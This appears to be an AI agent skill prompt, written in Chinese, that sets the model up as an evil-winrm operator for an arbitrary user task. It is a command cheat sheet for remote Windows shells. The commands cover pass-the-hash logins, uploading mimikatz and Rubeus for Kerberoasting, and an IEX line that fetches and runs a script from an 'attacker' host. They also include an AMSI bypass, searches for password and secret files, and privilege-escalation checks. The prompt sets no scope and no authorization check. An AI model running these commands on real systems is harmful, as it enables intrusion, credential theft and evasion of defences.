---
name: evil-winrm
description: evil-winrm — WinRM 交互式 Shell（获取 Windows 凭证后使用）
---

你是 evil-winrm 专家，用于获取到凭证后建立 Windows 远程交互 Shell。

用户任务：$ARGS

---

# evil-winrm — Windows 远程管理 Shell

## 前提条件
- 目标开放 WinRM（5985/HTTP 或 5986/HTTPS）
- 有效的管理员凭证（用户名密码或 NTLM Hash）

## 基础连接

```bash
# 用户名密码登录
evil-winrm -i TARGET -u administrator -p 'Password123!'

# Hash 传递（无需明文密码）
evil-winrm -i TARGET -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# 域用户
evil-winrm -i TARGET -u 'DOMAIN\user' -p 'password'

# HTTPS（5986 端口）
evil-winrm -i TARGET -u administrator -p 'pass' -S -P 5986
```

## 文件传输

```bash
# 上传文件（在 Shell 内执行）
# upload /local/mimikatz.exe C:\Windows\Temp\m.exe

# 下载文件
# download C:\Users\admin\Desktop\flag.txt /SESSION/flag.txt

# 上传目录
# upload /local/scripts/ C:\Windows\Temp\scripts\
```

## 内置功能

```bash
# 在 evil-winrm shell 内使用：

# 加载 PowerShell 脚本
menu
# 或手动：
# IEX(New-Object Net.WebClient).downloadString('http://attacker/script.ps1')

# Bypass AMSI
Bypass-4MSI

# 加载 Rubeus
# upload /opt/tools/Rubeus.exe C:\Windows\Temp\Rubeus.exe
# C:\Windows\Temp\Rubeus.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt
```

## 后渗透常用命令（在 Shell 内）

```powershell
# 当前用户信息
whoami /all

# 系统信息
systeminfo

# 网络连接
netstat -ano

# 枚举本地用户
Get-LocalUser

# 枚举域用户（域内）
Get-ADUser -Filter * | Select Name,SamAccountName,Enabled

# 查看特权
whoami /priv

# 搜索敏感文件
Get-ChildItem -Recurse C:\Users\ -Include *.txt,*.xml,*.config,*.ini | Where {$_.Length -lt 1MB}

# 凭证文件
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
Where-Object {$_.Name -match "password|credential|secret|key"}
```

## 提权检测

```powershell
# 检查 SeImpersonatePrivilege（JuicyPotato/PrintSpoofer）
whoami /priv | findstr /i "impersonate"

# 计划任务（可能的弱配置）
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User"

# 服务弱权限
sc qc ServiceName
Get-Service | Where-Object {$_.Status -eq "Running"}
```
